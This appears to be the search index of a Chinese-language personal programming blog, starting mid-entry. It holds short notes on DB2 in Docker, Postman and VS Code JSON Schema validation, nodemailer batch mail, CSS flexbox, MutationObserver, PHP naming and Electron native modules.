api玩\n\n<!--more-->\n\n\n```bash\ndocker run -it -p 50000:50000 -e DB2INST1_PASSWORD=db2inst1-pwd -e LICENSE=accept ibmcom/db2express-c:latest bash\n```\n\n```\n$ su - db2inst1\n$ db2start\n$ db2sampl\n$ db2 connect to sample\n$ db2 \"SELECT * FROM STAFF\"\n```\n\n有畫面就是正常\n\n因為要實驗一個東西\n這篇紀錄到這邊\n\n參考來源：\n[通过Docker安装db2express-c — 董仁文的博客](https://dongrenwen.github.io/2018/05/07/docker-install-db2/#%E4%BB%8E%E7%BD%91%E7%BB%9C%E8%8E%B7%E5%8F%96db2express-c%E9%95%9C%E5%83%8F)（沒有加上db2start）\n[ibmcom/db2express-c - Docker Hub](https://hub.docker.com/r/ibmcom/db2express-c/)\n[IBM Knowledge Center - 驗證分割的資料庫伺服器安裝（Linux 及 UNIX）](https://www.ibm.com/support/knowledgecenter/zh-tw/SSEPGG_10.5.0/com.ibm.db2.luw.qb.server.doc/doc/t0008501.html)","tags":["docker"],"categories":["Docker"]},{"title":"時間換算的小技巧","url":"%2Fblog%2F2018%2F11%2F07%2F%E6%99%82%E9%96%93%E6%8F%9B%E7%AE%97%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7%2F","content":"\n01:10 字串換算秒數很麻煩\n今天看到神奇的解法\n筆記筆記\n\n<!--more-->\n\n```php\n<?php\n$time=\"01:10\";\nforeach (array_reverse(explode(':', $time)) as $index => $value) $sec += pow(60, $index) * $value;\n```\n\n最近看到神同事寫這段超短\n超漂亮\n我從來沒有想到`pow`可以運用到這個地方\n雖然程效上，只會跑兩層\n到24小時就換一天了XD\n不過寫得真的很漂亮\n稍微改成js版本\n\n```javascript\nvar time = '01:01'\nvar time_array = time.split(':').reverse()\nvar sec = 0\ntime_array.forEach(  (value,index) => sec += Math.pow(60,index) * value  );\n```","tags":["javascript"],"categories":["JavaScript"]},{"title":"postman驗證JSON Schema方法","url":"%2Fblog%2F2018%2F11%2F05%2Fpostman%E9%A9%97%E8%AD%89JSON-Schema%E6%96%B9%E6%B3%95%2F","content":"\n最近在實作 API，發現上次只有做 VSCODE 檢查\npostman 假如可以用的話，也很方便\n\n<!--more-->\n\n```js\nvar schema = {\n    \"$schema\": \"http://json-schema.org/draft-06/schema#\",\n        ......(略)\n    }\n};\n\npm.test(\"Check JSON\", function () {\n    var jsonData = pm.response.json();\n  var valid = tv4.validate(jsonData, schema, false, true);\n  if (valid !== true) {\n      console.log(tv4.error);\n      tests['tv4.error:' + tv4.error] = true;\n  }\n  pm.expect(valid).to.be.true;\n});\n```\n\n只要在`pre-test`放這段就可以檢查了\n\n參考來源:\n\n- [How do I test JSON schema in postman using tv4? - Stack Overflow](https://stackoverflow.com/questions/48098530/how-do-i-test-json-schema-in-postman-using-tv4)\n- [javascript - Debug output in tests - Stack Overflow](https://stackoverflow.com/questions/31157675/debug-output-in-tests)\n\n2018-11-07\n\n最近應為錯誤發現不會提示顯示哪裡錯誤\n所以爬到[How do I test JSON schema in postman using tv4? - Stack Overflow](https://stackoverflow.com/questions/48098530/how-do-i-test-json-schema-in-postman-using-tv4)\n修改一下程式碼\n\n```javascript\npm.test(\"Check JSON\", function() {\n  var jsonData = pm.response.json();\n  var valid = tv4.validateMultiple(jsonData, schema, false, true);\n  if (valid.errors) {\n    valid.errors.forEach(\n      (value, index) => (tests[value.schemaPath + \":\" + value.message] = true)\n    );\n  }\n  pm.expect(valid.errors.length === 0).to.be.true;\n});\n```\n\n最後，假如要用上次 VSCODE\n`setting.json`好像沒辦法自動設定所有 json 檔案\n~~只能單一設定~~\n\n```json\n{\n  \"json.schemas\": [\n    {\n      \"fileMatch\": [\"xxx.api.json\"],\n      \"url\": \"./xxx.schema.json\"\n    },\n    {\n      \"fileMatch\": [\"oooo.json\"],\n      \"url\": \"./oooo.schema.json\"\n    }\n  ]\n}\n```\n\n~~未來有找到好方法再補~~\n有找到[VSCode 配置文件的变量索引 - 知乎](https://zhuanlan.zhihu.com/p/44967536)\n\n```json\n{\n  //不能使用\n  \"json.schemas\": [\n    {\n      \"fileMatch\": [\"${fileBasenameNoExtension}.json\"],\n      \"url\": \"./${fileBasenameNoExtension}.schema.json\"\n    }\n  ]\n}\n```\n\n~~明天測試看能不能用~~\n\n2018-11-09\n確定不能使用\n\nREST Client 好像沒有 JSON Schema 檢查工具\n\n一些 github 上檢驗工具\n[ebdrup/json-schema-benchmark: Benchmarks for Node.js JSON-schema validators](https://github.com/ebdrup/json-schema-benchmark)\n\n2019-05-22\n另類檢查寫法\n\n```js\nvar data = JSON.parse(responseBody);\n\npm.test(\"response must be valid and have a body\", function() {\n  // assert that the status code is 200\n  pm.response.to.be.ok;\n  // assert that the response has a valid JSON body\n  pm.response.to.be.withBody;\n  pm.response.to.be.json;\n});\n\npm.test(\"respnse body has xxxx ?\", function() {\n  pm.expect(data.response.xxxx).is.not.empty;\n  pm.response.to.not.have.jsonBody(\"error\");\n});\n```\n\n參考來源:\n[Test scripts | Postman Learning Center](https://learning.getpostman.com/docs/postman/scripts/test_scripts/)\n","tags":["json schema"],"categories":["實用工具"]},{"title":"使用nodemailer做批次寄信","url":"%2Fblog%2F2018%2F10%2F30%2F%E4%BD%BF%E7%94%A8nodemailer%E5%81%9A%E6%89%B9%E6%AC%A1%E5%AF%84%E4%BF%A1%2F","content":"\n由於之前工單信件寫錯...\n需要補寄信件給使用者\n今天研究nodejs使用nodemailer發信\n發現真的還滿簡單好用\n說不定下次就有機會可以用到\n\n\n<!--more-->\n\n## nodemailer\n[malagege/sample-code-node-mail-batch: 批次發信範例](https://github.com/malagege/sample-code-node-mail-batch)\n\n`可注意(1)(2)(3)要改的地方`\n```js\n/////////(1)\nconst csvFilePath='data.csv'\nvar mail_from = 'from@xxxx.com.tw'\nvar subject = '標題'\n\n\nvar nodemailer = require('nodemailer');\nconst csv=require('csvtojson')\n/////////(2)\nvar transporter = nodemailer.createTransport({\n    host: 'mail_server_url',\n    port: 25 ,\n    secure: false,\n    auth: {\n        user: 'from@xxxx.com.tw',\n        pass: 'password'\n    }\n});\ncsv()\n.fromFile(csvFilePath)\n.then((jsonObj)=>{\n    // console.log(jsonObj);\n    /**\n     * [\n     * \t{a:\"1\", b:\"2\", c:\"3\"},\n     * \t{a:\"4\", b:\"5\". c:\"6\"}\n     * ]\n     */ \n\n    jsonObj.forEach(data => {\n        /////////(3)\n        let mail_to = data.usermail\n        let email_template = `\n        Hello World!!!!\n        <img src=\"${data.pic_url}\"><br>\n        姓名：${data.username}<br>\n        訂單編號：${data.no}<br>\n        `\n\n        var mailOptions = {\n          from: mail_from,\n          to: mail_to,     //寄送人\n          subject: subject,\n          html: email_template,\n        };\n        \n      \n      // verify connection configuration\n      // transporter.verify(function(error, success) {\n      //   if (error) {\n      //        console.log(error);\n      //   } else {\n      //        console.log('Server is ready to take our messages');\n      //   }\n      // });\n      \n      transporter.sendMail(mailOptions, function(error, info) {\n        if (error) {\n          console.log('mail_to:' + mail_to)\n          console.log(error);\n        } else {\n          console.log(mail_to + ' , Email sent: ' + info.response);\n        }\n      });\n      \n      });\n\n})\n \n```\n\n另外，附加檔案可以參考[sample-code-node-mail-batch/test_add_file.js at master · malagege/sample-code-node-mail-batch](https://github.com/malagege/sample-code-node-mail-batch/blob/master/test_add_file.js)\n\n\n程式參考來源:\n[Nodejs发邮件组件Nodemailer | 粉丝日志](http://blog.fens.me/nodejs-email-nodemailer/)  {% asset_link web_bk.png 備份圖 %}\n\n\n## preview-email\n\nhttps://www.npmjs.com/package/preview-email\n\n可以簡單看預覽信件內容\n雖然我覺得可以用寫死一個信箱看...\n缺點好像附加檔案cid會抓不到\n\n```js\nconst previewEmail = require('preview-email');\n...\npreviewEmail(message).then(console.log).catch(console.error);\n//transport.sendMail(message).then(console.log).catch(console.error);\n```\nmessage跟nodemailer搭配\n\n\n\n最後，email-templates我就沒研究了\n看了文件感覺很複雜\n我就先用程式邏輯就可以跑出我想要的\n\n\n\n","tags":["nodemailer"],"categories":["JavaScript"]},{"title":"截圖工具紀錄","url":"%2Fblog%2F2018%2F10%2F30%2F%E6%88%AA%E5%9C%96%E5%B7%A5%E5%85%B7%E7%B4%80%E9%8C%84%2F","content":"\n最近朋友問我有甚麼好用截圖工具\n但我也沒有用過\n所以找了幾款\n之後說不定哪天我也會用到\n\n<!--more-->\n\n\n* [[免費] ImageSplitter 大圖切割/裁剪，圖檔分割工具 – 【重灌狂人】](https://briian.com/41204/)\n* [Trimto v1.4.5.1 快速幫圖片裁切、修改尺寸、存檔…一氣呵成！ – 【重灌狂人】](https://briian.com/21451/)\n* [ImageMagick之图片裁剪详解 - 简书](https://www.jianshu.com/p/bbf53b1acc18)\n* [分割图片——免费在线剪切图片成多个小图片](http://www.zuohaotu.com/cut-image.aspx)","tags":["截圖"],"categories":["實用工具"]},{"title":"flex 重直置中 內容大於畫面，上面被截掉解決方法","url":"%2Fblog%2F2018%2F10%2F25%2Fflex-%E9%87%8D%E7%9B%B4%E7%BD%AE%E4%B8%AD-%E5%85%A7%E5%AE%B9%E5%A4%A7%E6%96%BC%E7%95%AB%E9%9D%A2%EF%BC%8C%E4%B8%8A%E9%9D%A2%E8%A2%AB%E6%88%AA%E6%8E%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95%2F","content":"\n\n之前寫程式發現用flex垂直至中超出畫面會有問題\n一直以為都是用flex這個缺點不能用在大畫面上面\n不過今天網路上找到兩個答案\n簡單紀錄\n\n<!--more-->\n\n##  unsafe\n\njustify-content: safe center\nalign-self: safe center\n\n目前只有Firefox 63支援\n最近才到63XD\n\n\n## 子項目家margin:auto\n\n\n很神奇的margin\n\n\n可以直接用開發者工具去改[CSS - flexbox](http://zh-tw.learnlayout.com/flexbox.html)\n有點懶截圖\n\n\n參考來源:\n[html - Can't scroll to top of flex item that is overflowing container - Stack Overflow](https://stackoverflow.com/questions/33454533/cant-scroll-to-top-of-flex-item-that-is-overflowing-container)","tags":["css"],"categories":["CSS"]},{"title":"vue-chat-scroll和MutationObserver小記","url":"%2Fblog%2F2018%2F10%2F24%2Fvue-chat-scroll%E5%92%8CMutationObserver%E5%B0%8F%E8%A8%98%2F","content":"\n最近突然想起以前看到有一個加項目，卷軸超過其範圍會自動往下\n印象中...是個DOM改變會自動偵測\n所以我以為是listiner\n但不是....\n\n<!--more-->\n\n\n[theomessin/vue-chat-scroll: Automatic scroll-to-bottom directive for vue.](https://github.com/theomessin/vue-chat-scroll)\n[Vue 插件開發 - 聊天視窗滾動與自動加載，關於MutationObserver/Custom Directive « YJ Blog](http://sj82516-blog.logdown.com/posts/3095129)\n\n簡單，使用就不說了\n\n\n\n原理是用MutationObserver\n但是不管DOM修改1000次，做rendering才會觸發\n小玩官網範例[vue-chat-scroll](https://theomessin.github.io/vue-chat-scroll/)\n可以看以下我小玩Promise\n\n官網是for一次回圈非同步處理，所以才會觸發很多次MutationObserver\n\n```html\n<button @click=\"pushMsg\">add item</button>\n    <h1>message</h1>\n    <div class=\"messages\" v-chat-scroll=\"{always: false}\">\n      <div class=\"message\" v-for=\"n in messages\" :key=\"n\">{{ n }}</div>\n    </div>\n```\n\n```js\n...\npushMsg(){\n        // for (let i = 0 ; i < 30 ; i++)\n        // fetch('https://baconipsum.com/api/?type=meat-and-filler&sentences=1&start-with-lorem=1').then(function (response) {\n        //   return response.json()\n        // }).then(data => this.messages.push(data[0]))\n\n        var temp = []\n        for (let i = 0 ; i < 30 ; i++)\n        temp.push(fetch('https://baconipsum.com/api/?type=meat-and-filler&sentences=1&start-with-lorem=1').then(function (response) {\n          return response.json()\n        }))\n\n        Promise.all(temp).then(data => data.forEach(e => this.messages.push(e)))\n        \n\n        // for (let i = 0 ; i < 30 ; i++)\n        //   this.messages.push(\"data[0]\")\n\n    }\n\n```\n\n## MutationObserver \n\n簡單紀錄一下\nMutationObserver 如上面所說`不管DOM修改1000次，做rendering才會觸發`\n所以它也不算一個listener原因\n\n除了範例對節點，它還可以對`屬性`、`內容`、`子層html`\n詳細看文件[MutationObserver - Web APIs | MDN](https://developer.mozilla.org/zh-TW/docs/Web/API/MutationObserver)\n\n由於很少網站資訊介紹MutationObserver\n[Mutation Observer API -- JavaScript 标准参考教程（alpha）](http://javascript.ruanyifeng.com/dom/mutationobserver.html)\n這個網站算介紹滿清楚的\n{% asset_link web_bk.png 備份圖 %}\n\n```\nvar article = document.querySelector('article');\n\nvar  options = {\n  'childList': true,\n  'attributes':true\n} ;\n\nobserver.observe(article, options);\n\n上面代码中，observe方法接受两个参数，第一个是所要观察的DOM元素是article，第二个是所要观察的变动类型（子节点变动和属性变动）。\n\n观察器所能观察的 DOM 变动类型（即上面代码的options对象），有以下几种。\n\n    childList：子节点的变动（指新增，删除或者更改）。\n    attributes：属性的变动。\n    characterData：节点内容或节点文本的变动。\n\n想要观察哪一种变动类型，就在option对象中指定它的值为true。需要注意的是，必须同时指定childList、attributes和characterData中的一种或多种，若未均指定将报错。\n\n除了变动类型，options对象还可以设定以下属性：\n\n    subtree：布尔值，表示是否将该观察器应用于该节点的所有后代节点。\n    attributeOldValue：布尔值，表示观察attributes变动时，是否需要记录变动前的属性值。\n    characterDataOldValue：布尔值，表示观察characterData变动时，是否需要记录变动前的值。\n    attributeFilter：数组，表示需要观察的特定属性（比如['class','src']）。\n\n// 开始监听文档根节点（即<html>标签）的变动\nmutationObserver.observe(document.documentElement, {\n  attributes: true,\n  characterData: true,\n  childList: true,\n  subtree: true,\n  attributeOldValue: true,\n  characterDataOldValue: true\n});\n\n```\n\n\n雖然除了聊天室感覺很需要這個功能\n但還想不到什麼情境可以用到....\n要真的用其實直接用[theomessin/vue-chat-scroll: Automatic scroll-to-bottom directive for vue.](https://github.com/theomessin/vue-chat-scroll)\n就可以了XD\n","tags":["vue"],"categories":["JavaScript"]},{"title":"PHP變數宣告大小寫與vscode PHP intellisense for codeigniter","url":"%2Fblog%2F2018%2F10%2F23%2FPHP%E8%AE%8A%E6%95%B8%E5%AE%A3%E5%91%8A%E5%A4%A7%E5%B0%8F%E5%AF%AB%E8%88%87vscode-PHP-intellisense-for-codeigniter%2F","content":"\n今天發現PHP變數大小事情\n還是小記，怕以後忘記\n<!--more-->\n\n class, function 命名呼叫可以大小寫沒有分\n 變數,和class屬性命名大小寫有分\n\n 後來簡單測試一下，感覺PHP `變數`跟`函式`可以撞名\n `變數`分大小寫\n `函式`不分大小寫\n這樣就通了\n\n還簡單做了小實驗\n```php\n<?php\nclass a{\n    public $b = 'test';\n    function b(){\n        echo 'test2';\n    }\n}\n\n$a = new A;\n$a->B();\n```\n\n\n```php\n<?php\nclass a{\n    public $b = 'test';\n    function a(){\n        echo 'test2';\n    }\n}\n\n$a = new A;\n$a->A();\n```\n跑出兩個`test2test2`\n~~不小心測出意料結果，別緊張~~\n這是因為`建構式`\n\nPHP7.0開始會有提示\n```\n<br />\n<b>Deprecated</b>:  Methods with the same name as their class will not be constructors in a future version of PHP; a has a deprecated constructor in <b>[...][...]</b> on line <b>4</b><br />\n```\n\n\n[PHP的細節觀念與撰寫習慣 – Bryce'S Note](http://blog.twbryce.com/php-writing-habit-detailed-concepts/)\n\n\n## vscode PHP intellisense for codeigniter\n\n[PHP intellisense for codeigniter - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=small.php-ci)\n\n安裝這個可以方便在vscode寫CI\n不過...由於我公司開發規範第一個檔名都要大寫...\n所以呼叫mod那邊好像怪怪的\n但方便PHP intellisense都是好套件XD\n\n但注意需要放置`system`\n由於我們公司專案沒有在底層放system\n所以需要自己copy一份`system`到目錄\n或去vscode設定那邊調整位置\n\n","tags":["vscode"],"categories":["PHP"]},{"title":"實用快速改table資料方法","url":"%2Fblog%2F2018%2F10%2F20%2F%E5%AF%A6%E7%94%A8%E5%BF%AB%E9%80%9F%E6%94%B9table%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%2F","content":"\n最近看到一種很神奇的寫法\n在這邊簡單記錄一下\n\n\n<!--more-->\n\n```html\n<table>\n    <tr>\n        <th></th>\n        <th>AA</th>\n        <th>BB</th>\n        <th>CC</th>\n        <th>DD</th>\n        <th>EE</th>\n    </tr>\n    <tr>\n        <th>項目1<th>\n        <td class=\"AA\">AA</td>\n        <td class=\"BB\">BB</td>\n        <td class=\"CC\">CC</td>\n        <td class=\"DD\">DD</td>\n        <td class=\"EE\">EE</td>\n    </tr>\n    <tr>\n        <th>項目2<th>\n        <td class=\"AA\">AA</td>\n        <td class=\"BB\">BB</td>\n        <td class=\"CC\">CC</td>\n        <td class=\"DD\">DD</td>\n        <td class=\"EE\">EE</td>\n    </tr>\n    <tr>\n        <th>項目2<th>\n        <td class=\"AA\">AA</td>\n        <td class=\"BB\">BB</td>\n        <td class=\"CC\">CC</td>\n        <td class=\"DD\">DD</td>\n        <td class=\"EE\">EE</td>\n    </tr>\n</table>\n```\n\n\n```js\n    $('table td').click(function(){    \n        if(!$(this).is('.input')){    \n            $(this).addClass('input').html('<input type=\"text\" value=\"'+ $(this).text() +'\" />').find('input').focus().blur(function(){    \n                var id = $(this).parent().siblings(\"th:eq(0)\").text();    \n                var thisclass = $(this).parent().attr(\"class\");\n                var thisvalue=$(this).val();    \n                 \n                $.ajax({    \n                  type: 'POST',    \n                  url: 'update',    \n                  data: \"id=\"+id+\"&thisclass=\"+thisclass+\"&thisvalue=\"+thisvalue,\n                });    \n                $(this).parent().removeClass('input').html($(this).val() || 0);    \n            });                        \n        }    \n    }).hover(function(){    \n        $(this).addClass('hover');    \n    },function(){    \n        $(this).removeClass('hover');    \n    });    \n```\n\n看到這個寫法，覺得他還缺少了存檔驗證\n所以修改程式碼\n```js\n$('table td').click(function(){    \n    var source_text = $(this).text();\nif(!$(this).is('.input')){    \n    $(this).addClass('input').html('<input type=\"text\" value=\"'+ $(this).text() +'\" />').find('input').focus().blur(function(){ \n        if (source_text == $(this).val()){   \n            $(this).parent().removeClass('input').html($(this).val() || 0);    \n        }\n    }).change(function(){\n        if (source_text == $(this).val()) return false;\n\n                var id = $(this).parent().siblings(\"th:eq(0)\").text();    \n                var thisclass = $(this).parent().attr(\"class\");\n                var thisvalue=$(this).val();    \n         \n        $.ajax({    \n          type: 'POST',    \n          url: 'update.php',    \n          data: \"thisid=\"+thisid+\"&thisclass=\"+thisclass+\"&thisvalue=\"+thisvalue,\n          success:()=>{\n            $(this).parent().removeClass('input').html($(this).val() || 0);   \n          },\n          error:()=>{\n            alert('更新失敗');\n            $(this).parent().removeClass('input').html(source_text || 0);\n          }\n\n        });    \n    });                        \n}    \n}).hover(function(){    \n$(this).addClass('hover');    \n},function(){    \n$(this).removeClass('hover');    \n});    \n```\n\n\nPHP部份就不寫了，其實可以不要用`class`來當改db名字\n不然還要多處理class 後面加的不份\n用`class`還需PHP後端還需要`split`空白過濾之後的東西\n\n\nPHP回傳錯誤，這樣能讓ajax進入error function\n[PHP: http_response_code - Manual](http://php.net/manual/en/function.http-response-code.php)","tags":["js"],"categories":["網頁"]},{"title":"驗證快速檢查JSON方法","url":"%2Fblog%2F2018%2F10%2F20%2F%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95%2F","content":"\n最近收到一份JSON格式資料\n要實作一個API程式\n在沒有任何文件囧境\n看完好幾千行JSON\n後來用Firefox下比對JSON長度\n但測試實候發現有些 integer 型態我傳成 string\n我發現單純用Firefox肉眼看不行\n在想有什麼實用工具可以驗證\n\n<!--more-->\n\n## 檢查JSON type\n\n### Paste JSON as Code -vscode套件\n[Paste JSON as Code - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=quicktype.quicktype)\n`Paste JSON as Code` 可以產生JSON Schema\n還可以產生測試程式\n有測試nodejs，還是無法知道哪裡有問題\n```\naa = require('./json_check');\n\naa.testToJson(`{\n    \"test\": \"test\"\n}`);\n```\n\n他還能產生`JSON schema`\n可以把JSON Schema貼到這個上面\n下面會回傳錯誤訊息\n[JSON Schema Validator - Newtonsoft](https://www.jsonschemavalidator.net/)\n\n### 線上驗證工具\n`JSON Schema Validator`   -   vscode套件本機好像失效，評價3顆星....\n[Json Schema with VS Code – Omkar's Tech Blog](https://omkarmore.wordpress.com/2017/04/07/json-schema/)\n\n範例\n[GitHub - omkarmore83/json-schema-vscode-example: Examples for Json Schema with Visual Studio code](https://github.com/omkarmore83/json-schema-vscode-example)\n\n## 內建VSCODE就有檢查工具\n內建就有的功能，但必須設定schema\n[JSON editing in Visual Studio Code](https://code.visualstudio.com/docs/languages/json#_json-schemas-settings)\n\n{% asset_img 1.png \"設定地方\" %}\n這邊可以選擇工作區域\n\n```json\n{\n    \"json.schemas\": [\n        {\n            \"fileMatch\": [\n                \".myconfig\"\n            ],\n            \"schema\": {\n                \"$schema\": \"http://json-schema.org/draft-04/schema#\",\n                \"properties\": {\n                    \"$schema\": {\n                        \"type\": \"string\"         \n                    }\n                },\n                \"patternProperties\": {\n                    \"Questions_(EN|DE)$\": {\n                        \"$ref\" : \"#/definitions/questions-schema\"\n                    }\n                },\n                \"additionalProperties\": false,\n                \"definitions\": {\n                    \"questions-schema\": {\n                        \"type\":\"array\",\n                        \"items\": {\n                            \"$ref\" : \"#/definitions/question-schema\"\n                        }\n                    },\n                    \"question-schema\": {\n                        \"properties\": {\n                            \"question\" : {\n                                \"type\": \"string\"\n                            },\n                            \"option_1\": {\n                                \"$ref\": \"#/definitions/option-schema\"       \n                            },\n                            \"option_2\": {\n                                \"$ref\": \"#/definitions/option-schema\"       \n                            },\n                            \"option_3\": {\n                                \"$ref\": \"#/definitions/option-schema\"       \n                            },\n                            \"option_4\": {\n                                \"$ref\": \"#/definitions/option-schema\"       \n                            },\n                            \"correct_option\": {\n                                \"type\": \"integer\",\n                                \"minimum\": 1,\n                                \"maximum\": 4\n                            },\n                            \"moreInfo\": {\n                                \"type\": \"string\"\n                            },\n                            \"level\": {\n                                \"type\": \"integer\",\n                                \"minimum\": 1,\n                                \"maximum\": 10,\n                                \"description\": \"Level inditates the deficulty of the question. Valid values between 1 and 10\"\n                            },\n                            \"category\": {\n                                \"$ref\": \"#/definitions/category-schema\"\n                            },\n                            \"multimedia\": {\n                                \"type\": \"array\",\n                                \"items\": {\n                                    \"$ref\": \"#/definitions/multimedia-item-schema\"\n                                }\n                            }\n                        },\n                        \"required\":[\n                            \"question\",\n                            \"option_1\",\n                            \"option_2\",\n                            \"option_3\",\n                            \"option_4\",\n                            \"correct_option\"                \n                        ],\n                        \"additionalProperties\": false,\n                        \"defaultSnippets\": [\n                            {\n                                \"label\" : \"New Question\",\n                                \"description\": \"Creates a New Question template\",\n                                \"body\": {\n                                    \"question\": \"$1\",\n                                    \"option_1\": \"$2\",\n                                    \"option_2\": \"$3\",\n                                    \"option_3\": \"$4\",\n                                    \"option_4\": \"$5\",\n                                    \"correct_option\": \"^$6\"                        \n                                }\n                            }\n                        ]\n                    },\n                    \"category-schema\": {\n                        \"enum\": [\n                            \"GEOGRAPHY\",\n                            \"HISTORY\",\n                            \"MATH\",\n                            \"CURRENT_AFFAIRS\"\n                        ]\n                    },\n                    \"multimedia-item-schema\": {\n                        \"type\": \"object\",\n                        \"properties\": {\n                            \"id\" : {\n                                \"type\": \"string\"\n                            },\n                            \"type\": {\n                                \"type\": \"string\"\n                            },\n                            \"path\": {\n                                \"type\": \"string\"\n                            }\n                        },\n                        \"required\": [\n                            \"id\",\n                            \"type\",\n                            \"path\"\n                        ],\n                        \"additionalProperties\": false\n                    },\n                    \"option-schema\": {\n                        \"oneOf\": [\n                            {\n                                \"type\": \"string\"\n                            },\n                            {\n                                \"type\": \"object\",\n                                \"properties\": {\n                                    \"image\": {\n                                        \"type\" : \"string\"\n                                    }\n                                }\n                            }\n                        ]\n                    }\n                }\n            }\n        },\n    ]\n}\n```\n當然全部都塞到這邊很難管理\n\n```json\n{\n    \"json.schemas\": [\n        {\n            \"fileMatch\": [\n                \"/lyric.api.json\"\n            ],\n            \"url\": \"./lyric.schema.json\"\n        }\n    ]\n}\n```\n比較注意的地方`fileMatch`不需要加`.`\n加.反而找不到位置\n可搭配`*`用在fileMatch\n\n{% asset_img 2.jpg \"驗證地方\" %}\n\n## 其他工具\n\n[GitHub - java-json-tools/json-schema-validator: A JSON Schema validation implementation in pure Java, which aims for correctness and performance, in that order](https://github.com/java-json-tools/json-schema-validator)\n\n一些JSON SCHEMA範例\n[JSON Schema Store](http://schemastore.org/json/)\n\n\n做完這個，我發現XML要怎麼快速檢單驗證呢\n但發現XML有一個叫XSD\n\n一些工具如下，參考來源:[XML Schema(XSD)验证工具？ - 码客](https://oomake.com/question/14248)\nXerces\nxmlstarlet\n[XML validator and editor for Windows](https://www.xml-buddy.com/ValidatorBuddy.htm)\n[Download XML Notepad 2007 from Official Microsoft Download Center](https://www.microsoft.com/en-us/download/details.aspx?id=7973)\n[筆記：Java IDE 從 XSD 轉出 XML – Aya Wong – Medium](https://medium.com/@ayawong/%E7%AD%86%E8%A8%98-java-ide-%E5%BE%9E-xsd-%E8%BD%89%E5%87%BA-xml-3fbd04e0bafc)\n[W3C XML Schema (XSD) Validation online](http://www.utilities-online.info/xsdvalidation/)\n[Jax 的工作紀錄: [PHP][Java][C#] 用 XSD 驗證 XML](https://jax-work-archive.blogspot.com/2015/02/php-xsd-xml.html)\n\n最後找了範例用在[W3C XML Schema (XSD) Validation online](http://www.utilities-online.info/xsdvalidation/)\n可以驗證成功\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"http://www.w3school.com.cn/dtd/note.dtd\">\n<note>\n<to>George</to>\n<from>John</from>\n<heading>Reminder</heading>\n<body>Don't forget the meeting!</body>\n</note>\n```\n\n```xml\n<?xml version=\"1.0\"?>\n<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\"\ntargetNamespace=\"http://www.w3school.com.cn\"\nxmlns=\"http://www.w3school.com.cn\"\nelementFormDefault=\"qualified\">\n\n<xs:element name=\"note\">\n    <xs:complexType>\n      <xs:sequence>\n\t<xs:element name=\"to\" type=\"xs:string\"/>\n\t<xs:element name=\"from\" type=\"xs:string\"/>\n\t<xs:element name=\"heading\" type=\"xs:string\"/>\n\t<xs:element name=\"body\" type=\"xs:string\"/>\n      </xs:sequence>\n    </xs:complexType>\n</xs:element>\n\n</xs:schema>\n```\n\n之後有用到，再寫一篇記錄出來","tags":["json"],"categories":["實用工具"]},{"title":"electron不會重覆開啟程式","url":"%2Fblog%2F2018%2F10%2F20%2Felectron%E4%B8%8D%E6%9C%83%E9%87%8D%E8%A6%86%E9%96%8B%E5%95%9F%E7%A8%8B%E5%BC%8F%2F","content":"\n最近爬到能electron不會重新開啟程式方法\n筆記筆記\n\n<!--more-->\n\n```js\n// 點擊圖標(桌面快捷方式)檢查當前活動實例的個數\nconst isSecondInstance = app.makeSingleInstance(() => {\n  if (mainWindow) {\n    if (mainWindow.isMinimized()) {\n      mainWindow.restore(); // 窗口從最小化恢復時觸發\n    }\n    mainWindow.show();\n    // mainWindow.maximize();\n    mainWindow.focus();\n  }\n});\nif (isSecondInstance) {\n  app.quit();\n}\n```\n\n參考[使用 electron-vue 搭建桌面應用開發模板 - 神馬文庫](https://www.smwenku.com/a/5b82232d2b717737e032a0d9/)\n{% asset_link 1.png 備份圖 %}","tags":["electron"],"categories":["JavaScript"]},{"title":"electron使用winapi筆記","url":"%2Fblog%2F2018%2F10%2F19%2Felectron%E4%BD%BF%E7%94%A8winapi%E7%AD%86%E8%A8%98%2F","content":"\n最近做一個蕃茄鐘，但是常常忘記點`開始時間`導致甚麼沒有用到\n爬文有查到winapi可以抓到閒置時間\n於是看electron是否能串接winapi資訊\n就踩到很多個雷\n\n<!--more-->\n\n首先，[winapi - npm](https://www.npmjs.com/package/winapi)\n`require('winapi').GetLastInputInfo`這個可以爬到我們要的功能\n以為會非常簡單，但是安裝卻不順利\n\n之前有爬到網頁講解node-gyp跟gyp介紹，但現在找不到\n但有找到有簡單介紹\n>node-gyp\n>\n>这货是 Node.js 中编译原生模块用的。自从 Node.js v0.8 之后，它就跟 Node.js 黏上了，在此之前它的默认编译帮助包是 node-waf[^3]，对于老 Noder 来说应该不会陌生的。\n>GYP\n\n>node-gyp 是基于 GYP[^4] 的。它会识别包或者项目中的 binding.gyp[^5] 文件，然后根据该配置文件生成各系统下能进行编译的项目，如 Windows 下生成 Visual Studio 项目文件（*.sln 等），Unix 下生成 Makefile。在生成这些项目文件之后，node-gyp 还能调用各系统的编译工具（如 GCC）来将项目进行编译，得到最后的动态链接库 *.node 文件。\n\n參考網址:[从暴力到 NAN 再到 NAPI——Node.js 原生模块开发方式变迁 · 一个伪宅级别的码畜。](https://xcoder.in/2017/07/01/nodejs-addon-history/)\n\n\n以為簡單安裝`node-gyp`就能搞定...，但其實要安裝VSSTUDIO C++跟 python2\n注意電腦有裝3的要讓預設變成2\n安裝環境建議到VM玩\n不然電腦會裝有的沒的東西\n我就選擇在VM Win7環境做編譯\n\n簡單記錄安裝`node-gyp`兩個方法\n\n1. `npm install --global --production windows-build-tools`\n\n2. 我發現新版版本自帶安裝選項，不過會裝更多有的沒的東西orz\n{% asset_img 1.png \"npm run serve:electron\" %}\n\n\n當我以為要成功的時候，但竟然跑出這個東西\n\n{% asset_img 3.png \"npm run serve:electron\" %}\n找到解決方法\n以下兩個步驟\n1. `npm run build:electron`會產生 winapi_win32_64_electron.node\n\n2. 修改node_module底下winapi的index.js程式\n這個是我依照錯誤去找的\n沒想到改成electron就能跑XD\n{% asset_img 4.png \"npm run serve:electron\" %}\n{% asset_img 2.png \"npm run serve:electron\" 